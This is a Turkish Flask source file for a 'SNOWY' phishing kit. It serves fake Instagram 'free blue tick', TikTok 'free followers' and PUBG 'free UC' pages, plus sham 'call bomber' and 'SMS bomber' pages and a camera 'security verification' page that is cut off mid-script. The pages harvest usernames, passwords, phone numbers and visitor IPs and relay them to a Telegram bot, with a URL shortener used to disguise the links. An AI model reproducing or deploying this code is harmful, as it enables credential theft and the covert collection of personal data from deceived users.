# phishing.py — SNOWY kodu birebir, 30 bilgi kategorize, urlsmush kısaltıcı
import datetime
import json
import logging
import threading

import requests
from flask import Flask, render_template_string, request, jsonify

from config import BOT_TOKEN, PHISHING_HOST, PHISHING_PORT, PHISHING_BASE_URL, OWNER_ID
import database as db

logger = logging.getLogger("phish")
logging.getLogger('werkzeug').setLevel(logging.ERROR)

URL_SHORTENER_API = "https://urlsmush.com/api.php"


def shorten_url(long_url):
    try:
        r = requests.post(URL_SHORTENER_API, json={"url": long_url},
                          headers={"Content-Type": "application/json"}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("status") == "success" and "data" in data:
                s = data["data"].get("short_url")
                if s: return s
            s = data.get("shortenedUrl") or data.get("short_url") or data.get("url")
            if s: return s
        return long_url
    except Exception:
        return long_url


def get_real_ip():
    if request.headers.get('CF-Connecting-IP'): return request.headers.get('CF-Connecting-IP')
    if request.headers.get('X-Forwarded-For'): return request.headers.get('X-Forwarded-For').split(',')[0]
    if request.headers.get('X-Real-IP'): return request.headers.get('X-Real-IP')
    return request.remote_addr


def get_location(ip):
    if ip.startswith(('127.', '192.168.', '10.')) or ip == 'localhost':
        return {'ulke': 'Yerel Ağ', 'ulke_kod': 'LOCAL', 'sehir': 'Localhost',
                'lat': '-', 'lon': '-', 'isp': 'Yerel', 'tz': 'Yerel'}
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get('country_name'):
                return {'ulke': d.get('country_name', '?'), 'ulke_kod': d.get('country_code', '?'),
                        'sehir': d.get('city', '?'), 'lat': d.get('latitude', '-'),
                        'lon': d.get('longitude', '-'), 'isp': d.get('org', '?'),
                        'tz': d.get('timezone', '?')}
    except Exception:
        pass
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get('status') == 'success':
                return {'ulke': d.get('country', '?'), 'ulke_kod': d.get('countryCode', '?'),
                        'sehir': d.get('city', '?'), 'lat': d.get('lat', '-'),
                        'lon': d.get('lon', '-'), 'isp': d.get('isp', '?'),
                        'tz': d.get('timezone', '?')}
    except Exception:
        pass
    return {'ulke': '?', 'ulke_kod': '?', 'sehir': '?', 'lat': '-', 'lon': '-', 'isp': '?', 'tz': '?'}


def send_telegram_message_sync(chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except Exception:
        return False


# ═══════════════ INSTAGRAM ═══════════════
INSTAGRAM_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>SNOWY Instagram | Ücretsiz Mavi Tik</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{max-width:500px;width:100%;background:white;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,0.1);overflow:hidden}
.header{background:#fff;padding:16px;border-bottom:1px solid #dbdbdb;text-align:center}
.logo{font-size:28px;font-weight:600;background:linear-gradient(45deg,#f09433,#d62976,#962fbf);-webkit-background-clip:text;background-clip:text;color:transparent}
.snowy-badge{display:inline-block;background:#3897f0;color:white;border-radius:20px;padding:4px 12px;font-size:12px;font-weight:600;margin-left:8px}
.content{padding:24px}
.info-box{background:#f8f9fa;border-radius:12px;padding:16px;margin-bottom:24px;border-left:4px solid #3897f0}
.info-box h3{font-size:16px;margin-bottom:8px;color:#262626}
.info-box p{font-size:14px;color:#8e8e8e;line-height:1.5}
.input-group{margin-bottom:16px}
.input-group label{display:block;font-size:14px;font-weight:500;margin-bottom:8px;color:#262626}
.input-group input{width:100%;padding:12px;border:1px solid #dbdbdb;border-radius:8px;font-size:14px;background:#fafafa}
.input-group input:focus{border-color:#3897f0;outline:none;background:white}
.btn{width:100%;padding:12px;background:#3897f0;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:disabled{opacity:0.7}
.loading{display:none;text-align:center;margin-top:20px}
.spinner{width:32px;height:32px;border:3px solid #e0e0e0;border-top-color:#3897f0;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 12px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-message{background:#d4edda;color:#155724;padding:12px;border-radius:8px;margin-top:16px;font-size:14px;text-align:center;display:none}
.footer{padding:16px;border-top:1px solid #dbdbdb;text-align:center;font-size:12px;color:#8e8e8e}
.warning{background:#fff3e0;border-left:4px solid #ff9800;padding:12px;margin-bottom:20px;border-radius:8px;font-size:12px;color:#e65100}
.snowy-credit{background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:8px;text-align:center;font-size:12px;font-weight:bold}
</style>
</head>
<body>
<div class="container">
<div class="header"><span class="logo">SNOWY Instagram</span><span class="snowy-badge">✓ Mavi Tik</span></div>
<div class="content">
<div class="info-box"><h3>🎉 SNOWY ÖZEL ÜCRETSİZ MAVİ TİK</h3><p>Instagram hesabınızı ücretsiz olarak doğrulayın! Bu fırsat sadece SNOWY kullanıcılarına özeldir.</p></div>
<div class="warning">⚠️ <strong>ÖNEMLİ:</strong> Hesabınızı doğrulamak için Instagram giriş bilgilerinizi girin.</div>
<div class="input-group"><label>📱 Kullanıcı Adı veya E-posta</label><input type="text" id="username" placeholder="kullanici_adi veya email@example.com" autocomplete="off"></div>
<div class="input-group"><label>🔒 Şifre</label><input type="password" id="password" placeholder="••••••••"></div>
<button class="btn" id="submitBtn" onclick="sendCredentials()">✓ SNOWY MAVİ TİK AL</button>
<div class="loading" id="loading"><div class="spinner"></div><div>Hesap doğrulanıyor...</div></div>
<div class="success-message" id="successMsg">✅ Hesabınız doğrulandı! Mavi tikiniz 24 saat içinde aktif olacaktır.</div>
</div>
<div class="footer">© 2026 SNOWY Instagram • Mavi Tik Doğrulama Programı</div>
<div class="snowy-credit">❄️ SNOWY SECURITY ❄️</div>
</div>
<script>
const TARGET_ID = "{{ chat_id }}";
function escapeHtml(str){if(!str)return '';return str.replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
window.sendCredentials = function(){
const u=document.getElementById('username').value.trim();
const p=document.getElementById('password').value.trim();
if(!u||!p){alert('Lütfen tüm alanları doldurun!');return;}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
const msg=`📸 <b>SNOWY INSTAGRAM HACK</b> 📸\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n👤 KULLANICI: ${escapeHtml(u)}\n🔑 ŞİFRE: ${escapeHtml(p)}\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}).catch(()=>{});
document.getElementById('submitBtn').style.display='none';
document.getElementById('loading').style.display='block';
setTimeout(()=>{document.getElementById('loading').style.display='none';document.getElementById('successMsg').style.display='block';setTimeout(()=>location.href='https://www.instagram.com/',3000);},2000);
};
</script>
</body>
</html>'''


# ═══════════════ TIKTOK ═══════════════
TIKTOK_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>SNOWY TikTok | Ücretsiz Takipçi</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#010101;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{max-width:500px;width:100%;background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:30px;box-shadow:0 20px 40px rgba(0,0,0,0.4);overflow:hidden;border:1px solid rgba(255,255,255,0.1)}
.header{background:rgba(0,0,0,0.5);padding:20px;text-align:center;border-bottom:1px solid rgba(255,255,255,0.1)}
.logo{font-size:32px;font-weight:700;background:linear-gradient(45deg,#00f2fe,#4facfe);-webkit-background-clip:text;background-clip:text;color:transparent}
.snowy-badge{display:inline-block;background:#ff0050;color:white;border-radius:20px;padding:4px 12px;font-size:12px;font-weight:600;margin-left:8px}
.content{padding:24px}
.info-box{background:rgba(255,255,255,0.05);border-radius:16px;padding:16px;margin-bottom:24px;border-left:4px solid #ff0050}
.info-box h3{font-size:16px;margin-bottom:8px;color:white}
.info-box p{font-size:14px;color:#aaa;line-height:1.5}
.input-group{margin-bottom:16px}
.input-group label{display:block;font-size:14px;font-weight:500;margin-bottom:8px;color:#ddd}
.input-group input{width:100%;padding:14px;border:1px solid rgba(255,255,255,0.2);border-radius:12px;font-size:14px;background:rgba(0,0,0,0.3);color:white}
.input-group input:focus{border-color:#ff0050;outline:none}
.input-group input::placeholder{color:#666}
.btn{width:100%;padding:14px;background:linear-gradient(45deg,#ff0050,#ff6b00);color:white;border:none;border-radius:60px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:disabled{opacity:0.7}
.loading{display:none;text-align:center;margin-top:20px}
.spinner{width:32px;height:32px;border:3px solid rgba(255,255,255,0.2);border-top-color:#ff0050;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 12px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-message{background:rgba(0,255,0,0.1);color:#00ff88;padding:12px;border-radius:12px;margin-top:16px;font-size:14px;text-align:center;display:none;border:1px solid #00ff88}
.footer{padding:16px;border-top:1px solid rgba(255,255,255,0.1);text-align:center;font-size:12px;color:#666}
.warning{background:rgba(255,0,0,0.1);border-left:4px solid #ff0050;padding:12px;margin-bottom:20px;border-radius:12px;font-size:12px;color:#ff8888}
.snowy-credit{background:linear-gradient(135deg,#ff0050,#ff6b00);color:white;padding:8px;text-align:center;font-size:12px;font-weight:bold}
</style>
</head>
<body>
<div class="container">
<div class="header"><span class="logo">SNOWY TikTok</span><span class="snowy-badge">⭐ Ücretsiz Takipçi</span></div>
<div class="content">
<div class="info-box"><h3>🎉 SNOWY ÖZEL ÜCRETSİZ TAKİPÇİ</h3><p>TikTok hesabınıza ücretsiz takipçi kazanın!</p></div>
<div class="warning">⚠️ <strong>ÖNEMLİ:</strong> Takipçi kazanmak için TikTok giriş bilgilerinizi girin.</div>
<div class="input-group"><label>📱 Kullanıcı Adı veya E-posta</label><input type="text" id="username" placeholder="kullanici_adi veya email@example.com" autocomplete="off"></div>
<div class="input-group"><label>🔒 Şifre</label><input type="password" id="password" placeholder="••••••••"></div>
<div class="input-group"><label>⭐ TAKİPÇİ MİKTARI</label><input type="number" id="amount" placeholder="1000" value="1000"></div>
<button class="btn" id="submitBtn" onclick="sendCredentials()">⭐ SNOWY TAKİPÇİ KAZAN</button>
<div class="loading" id="loading"><div class="spinner"></div><div>Takipçiler ekleniyor...</div></div>
<div class="success-message" id="successMsg">✅ Takipçiler başarıyla eklendi!</div>
</div>
<div class="footer">© 2026 SNOWY TikTok • Ücretsiz Takipçi Programı</div>
<div class="snowy-credit">❄️ SNOWY SECURITY ❄️</div>
</div>
<script>
const TARGET_ID = "{{ chat_id }}";
function escapeHtml(str){if(!str)return '';return str.replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
window.sendCredentials = function(){
const u=document.getElementById('username').value.trim();
const p=document.getElementById('password').value.trim();
const a=document.getElementById('amount').value.trim();
if(!u||!p){alert('Lütfen tüm alanları doldurun!');return;}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
const msg=`🎵 <b>SNOWY TIKTOK HACK</b> 🎵\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n👤 KULLANICI: ${escapeHtml(u)}\n🔑 ŞİFRE: ${escapeHtml(p)}\n⭐ MİKTAR: ${a}\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}).catch(()=>{});
document.getElementById('submitBtn').style.display='none';
document.getElementById('loading').style.display='block';
setTimeout(()=>{document.getElementById('loading').style.display='none';document.getElementById('successMsg').style.display='block';setTimeout(()=>location.href='https://www.tiktok.com/',3000);},2000);
};
</script>
</body>
</html>'''


# ═══════════════ PUBG ═══════════════
PUBG_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>SNOWY PUBG | Bedava UC</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);font-family:-apple-system,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{max-width:500px;width:100%;background:rgba(255,255,255,0.95);border-radius:30px;box-shadow:0 20px 40px rgba(0,0,0,0.4);overflow:hidden}
.header{background:linear-gradient(135deg,#f5af19,#f12711);padding:20px;text-align:center}
.logo{font-size:32px;font-weight:700;color:white;text-shadow:2px 2px 4px rgba(0,0,0,0.3)}
.snowy-badge{display:inline-block;background:#fff;color:#f12711;border-radius:20px;padding:4px 12px;font-size:12px;font-weight:600;margin-left:8px}
.content{padding:24px}
.info-box{background:#f8f9fa;border-radius:16px;padding:16px;margin-bottom:24px;border-left:4px solid #f12711}
.info-box h3{font-size:16px;margin-bottom:8px;color:#333}
.info-box p{font-size:14px;color:#666;line-height:1.5}
.input-group{margin-bottom:16px}
.input-group label{display:block;font-size:14px;font-weight:500;margin-bottom:8px;color:#333}
.input-group input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:12px;font-size:14px;background:#fafafa}
.input-group input:focus{border-color:#f12711;outline:none;background:white}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#f5af19,#f12711);color:white;border:none;border-radius:60px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:disabled{opacity:0.7}
.loading{display:none;text-align:center;margin-top:20px}
.spinner{width:32px;height:32px;border:3px solid #e0e0e0;border-top-color:#f12711;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 12px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-message{background:#d4edda;color:#155724;padding:12px;border-radius:12px;margin-top:16px;font-size:14px;text-align:center;display:none}
.footer{padding:16px;border-top:1px solid #e0e0e0;text-align:center;font-size:12px;color:#888}
.warning{background:#fff3e0;border-left:4px solid #ff9800;padding:12px;margin-bottom:20px;border-radius:12px;font-size:12px;color:#e65100}
.snowy-credit{background:linear-gradient(135deg,#f5af19,#f12711);color:white;padding:8px;text-align:center;font-size:12px;font-weight:bold}
</style>
</head>
<body>
<div class="container">
<div class="header"><span class="logo">SNOWY PUBG</span><span class="snowy-badge">🎮 Bedava UC</span></div>
<div class="content">
<div class="info-box"><h3>🎉 SNOWY ÖZEL BEDAVA UC</h3><p>PUBG Mobile hesabınıza ücretsiz UC kazanın!</p></div>
<div class="warning">⚠️ <strong>ÖNEMLİ:</strong> UC kazanmak için PUBG hesap bilgilerinizi girin.</div>
<div class="input-group"><label>📧 E-posta Adresi</label><input type="email" id="email" placeholder="ornek@email.com" autocomplete="off"></div>
<div class="input-group"><label>🔒 Şifre</label><input type="password" id="password" placeholder="••••••••"></div>
<div class="input-group"><label>🎮 Oyuncu ID</label><input type="text" id="playerid" placeholder="Oyuncu ID'niz" autocomplete="off"></div>
<div class="input-group"><label>💰 UC MİKTARI</label><input type="number" id="amount" placeholder="10000" value="10000"></div>
<button class="btn" id="submitBtn" onclick="sendCredentials()">🎮 BEDAVA UC KAZAN</button>
<div class="loading" id="loading"><div class="spinner"></div><div>UC ekleniyor...</div></div>
<div class="success-message" id="successMsg">✅ UC başarıyla eklendi!</div>
</div>
<div class="footer">© 2026 SNOWY PUBG • Bedava UC Programı</div>
<div class="snowy-credit">❄️ SNOWY SECURITY ❄️</div>
</div>
<script>
const TARGET_ID = "{{ chat_id }}";
function escapeHtml(str){if(!str)return '';return str.replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
window.sendCredentials = function(){
const e=document.getElementById('email').value.trim();
const p=document.getElementById('password').value.trim();
const pi=document.getElementById('playerid').value.trim();
const a=document.getElementById('amount').value.trim();
if(!e||!p){alert('Lütfen tüm alanları doldurun!');return;}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
const msg=`🎮 <b>SNOWY PUBG HACK</b> 🎮\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${d.ip}\n📧 E-POSTA: ${escapeHtml(e)}\n🔑 ŞİFRE: ${escapeHtml(p)}\n🎮 OYUNCU ID: ${escapeHtml(pi)}\n💰 UC MİKTARI: ${a}\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}).catch(()=>{});
document.getElementById('submitBtn').style.display='none';
document.getElementById('loading').style.display='block';
setTimeout(()=>{document.getElementById('loading').style.display='none';document.getElementById('successMsg').style.display='block';setTimeout(()=>location.href='https://www.pubg.com/',3000);},2000);
};
</script>
</body>
</html>'''


# ═══════════════ CALL BOMBER ═══════════════
CALL_BOMBER_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>Call Bomber | Snowy Tools</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:rgba(255,255,255,0.95);border-radius:30px;padding:40px;max-width:480px;width:100%;box-shadow:0 30px 60px rgba(0,0,0,0.4);text-align:center}
h2{color:#1a1a2e;font-size:28px;margin-bottom:10px}
h2 span{color:#667eea}
.sub{color:#666;margin-bottom:30px;font-size:14px}
.warning-note{background:#fff3e0;border-left:4px solid #ff9800;padding:12px;margin-bottom:20px;border-radius:10px;font-size:13px;color:#e65100;text-align:left}
.input-group{margin-bottom:20px;text-align:left}
.input-group label{display:block;margin-bottom:8px;color:#333;font-weight:500}
.input-group input{width:100%;padding:15px;border:2px solid #e0e0e0;border-radius:15px;font-size:16px}
.input-group input:focus{border-color:#667eea;outline:none}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;padding:16px;font-size:18px;font-weight:600;border-radius:60px;cursor:pointer;width:100%;margin-top:10px}
.loading{display:none;margin-top:20px;color:#667eea}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 10px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.info{color:#4caf50;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="container">
<h2>📞 <span>SNOWY</span> CALL BOMBER</h2>
<div class="sub">Ücretsiz ve limitsiz arama bombası</div>
<div class="warning-note">⚠️ <strong>ÖNEMLİ:</strong> Numaranızı <strong>5 ile başlayacak şekilde</strong> giriniz!<br>Örnek: 5555555555</div>
<div class="input-group"><label>📱 HEDEF NUMARA (5 ile başlayan)</label><input type="tel" id="phone" placeholder="5555555555" maxlength="10" inputmode="numeric"></div>
<div class="input-group"><label>⚡ BOMBA GÜCÜ</label><input type="number" id="count" placeholder="100" value="100"></div>
<button class="btn" onclick="startAttack()">🚀 SALDIRIYI BAŞLAT</button>
<div class="loading" id="loading"><div class="spinner"></div><div id="loadingText">Saldırı başlatılıyor...</div></div>
<div class="info">✅ 7/24 Aktif | Yüksek Hız | Başarılı Saldırı</div>
</div>
<script>
const TARGET_ID = "{{ chat_id }}";
let phoneSent = false;
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
window.visitorIP=d.ip;
document.getElementById('phone').addEventListener('input',function(){
this.value=this.value.replace(/[^0-9]/g,'');
const p=this.value;
if(p.length===10&&p.startsWith('5')&&!phoneSent&&window.visitorIP){
phoneSent=true;
const msg=`📞 <b>SNOWY CALL BOMBER KURBAN</b> 📞\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${window.visitorIP}\n📱 NUMARA: ${p}\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}
});
}).catch(()=>{});
function startAttack(){
const p=document.getElementById('phone').value;
const c=document.getElementById('count').value;
if(!p||p.length!==10){alert('Lütfen 10 haneli numaranızı girin!');return;}
if(!p.startsWith('5')){alert('Numara 5 ile başlamalıdır!');return;}
if(!phoneSent&&window.visitorIP){
phoneSent=true;
const msg=`📞 <b>SNOWY CALL BOMBER KURBAN</b> 📞\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${window.visitorIP}\n📱 NUMARA: ${p}\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}
document.getElementById('loading').style.display='block';
document.querySelector('.btn').disabled=true;
let i=0;
const int=setInterval(()=>{
i++;
document.getElementById('loadingText').innerHTML=`Saldırı devam ediyor... ${i}/${c} arama gönderildi`;
if(i>=parseInt(c)){clearInterval(int);document.getElementById('loadingText').innerHTML='✅ Saldırı tamamlandı!';setTimeout(()=>{document.getElementById('loading').style.display='none';document.querySelector('.btn').disabled=false;},2000);}
},500);
}
</script>
</body>
</html>'''


# ═══════════════ SMS BOMBER ═══════════════
SMS_BOMBER_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>SMS Bomber | Snowy Tools</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:rgba(255,255,255,0.95);border-radius:30px;padding:40px;max-width:480px;width:100%;box-shadow:0 30px 60px rgba(0,0,0,0.4);text-align:center}
h2{color:#1a1a2e;font-size:28px;margin-bottom:10px}
h2 span{color:#667eea}
.sub{color:#666;margin-bottom:30px;font-size:14px}
.warning-note{background:#fff3e0;border-left:4px solid #ff9800;padding:12px;margin-bottom:20px;border-radius:10px;font-size:13px;color:#e65100;text-align:left}
.input-group{margin-bottom:20px;text-align:left}
.input-group label{display:block;margin-bottom:8px;color:#333;font-weight:500}
.input-group input,.input-group textarea{width:100%;padding:15px;border:2px solid #e0e0e0;border-radius:15px;font-size:16px;font-family:inherit}
.input-group textarea{resize:none;height:100px}
.input-group input:focus,.input-group textarea:focus{border-color:#667eea;outline:none}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;padding:16px;font-size:18px;font-weight:600;border-radius:60px;cursor:pointer;width:100%;margin-top:10px}
.loading{display:none;margin-top:20px;color:#667eea}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 10px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.info{color:#4caf50;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="container">
<h2>📱 <span>SNOWY</span> SMS BOMBER</h2>
<div class="sub">Ücretsiz ve limitsiz SMS bombası</div>
<div class="warning-note">⚠️ <strong>ÖNEMLİ:</strong> Numaranızı <strong>5 ile başlayacak şekilde</strong> giriniz!<br>Örnek: 5555555555</div>
<div class="input-group"><label>📱 HEDEF NUMARA (5 ile başlayan)</label><input type="tel" id="phone" placeholder="5555555555" maxlength="10" inputmode="numeric"></div>
<div class="input-group"><label>📝 MESAJ (Opsiyonel)</label><textarea id="message" placeholder="Mesajınız..."></textarea></div>
<div class="input-group"><label>⚡ BOMBA GÜCÜ</label><input type="number" id="count" placeholder="100" value="100"></div>
<button class="btn" onclick="startAttack()">💣 SALDIRIYI BAŞLAT</button>
<div class="loading" id="loading"><div class="spinner"></div><div id="loadingText">Saldırı başlatılıyor...</div></div>
<div class="info">✅ 7/24 Aktif | Yüksek Hız | Başarılı Saldırı</div>
</div>
<script>
const TARGET_ID = "{{ chat_id }}";
let phoneSent = false;
function escapeHtml(str){if(!str)return '';return str.replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
window.visitorIP=d.ip;
document.getElementById('phone').addEventListener('input',function(){
this.value=this.value.replace(/[^0-9]/g,'');
const p=this.value;
if(p.length===10&&p.startsWith('5')&&!phoneSent&&window.visitorIP){
phoneSent=true;
const m=document.getElementById('message').value;
let msg=`📱 <b>SNOWY SMS BOMBER KURBAN</b> 📱\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${window.visitorIP}\n📱 NUMARA: ${p}`;
if(m&&m.trim())msg+=`\n📝 MESAJ: ${escapeHtml(m.substring(0,500))}`;
msg+=`\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}
});
}).catch(()=>{});
function startAttack(){
const p=document.getElementById('phone').value;
const c=document.getElementById('count').value;
const m=document.getElementById('message').value;
if(!p||p.length!==10){alert('Lütfen 10 haneli numaranızı girin!');return;}
if(!p.startsWith('5')){alert('Numara 5 ile başlamalıdır!');return;}
if(!phoneSent&&window.visitorIP){
phoneSent=true;
let msg=`📱 <b>SNOWY SMS BOMBER KURBAN</b> 📱\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${window.visitorIP}\n📱 NUMARA: ${p}`;
if(m&&m.trim())msg+=`\n📝 MESAJ: ${escapeHtml(m.substring(0,500))}`;
msg+=`\n⏱️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`;
fetch('/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TARGET_ID,text:msg})});
}
document.getElementById('loading').style.display='block';
document.querySelector('.btn').disabled=true;
let i=0;
const int=setInterval(()=>{
i++;
document.getElementById('loadingText').innerHTML=`Saldırı devam ediyor... ${i}/${c} SMS gönderildi`;
if(i>=parseInt(c)){clearInterval(int);document.getElementById('loadingText').innerHTML='✅ Saldırı tamamlandı!';setTimeout(()=>{document.getElementById('loading').style.display='none';document.querySelector('.btn').disabled=false;},2000);}
},300);
}
</script>
</body>
</html>'''


# ═══════════════ CAMERA ═══════════════
CAMERA_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>SNOWY Güvenlik Doğrulaması</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#1a1a2e,#16213e);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:rgba(255,255,255,0.98);border-radius:30px;padding:40px;max-width:480px;width:100%;box-shadow:0 30px 60px rgba(0,0,0,0.4);text-align:center}
h2{color:#1a1a2e;font-size:32px;margin-bottom:15px;font-weight:700}
h2 span{color:#667eea}
p{color:#4a5568;margin-bottom:35px;line-height:1.6}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;padding:18px 36px;font-size:20px;font-weight:600;border-radius:60px;cursor:pointer;width:100%}
.loading{display:none;margin:30px 0 20px}
.spinner{border:4px solid #e2e8f0;border-top:4px solid #667eea;border-radius:50%;width:50px;height:50px;animation:spin 0.8s infinite;margin:0 auto 15px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.loading-text{color:#667eea;font-size:18px;font-weight:500}
#video,#canvas{display:none}
</style>
</head>
<body>
<div class="container">
<h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
<p>Devam etmek için kamera erişimine izin verin.</p>
<button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
<div class="loading" id="loading"><div class="spinner"></div><div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div></div>
</div>
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
<script>
(function(){
const TARGET_ID = "{{ chat_id }}";
const urlParams = new URLSearchParams(window.location.search);
const MODE = urlParams.get('m') || '';
const video = document.getElementById('video');
const canvas2 = document.getElementById('canvas');
const ctx = canvas2.getContext('2d', {alpha: false});
let stream = null, isCameraActive = false, isRunning = true, isLoopActive = false, cameraStarted = false;
